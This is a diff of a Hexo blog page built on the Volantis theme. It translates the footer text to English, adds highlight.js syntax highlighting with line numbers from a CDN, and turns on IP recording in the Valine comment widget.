@@ -711,7 +756,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -723,9 +768,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -858,6 +903,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1071,7 +1118,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1127,6 +1174,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
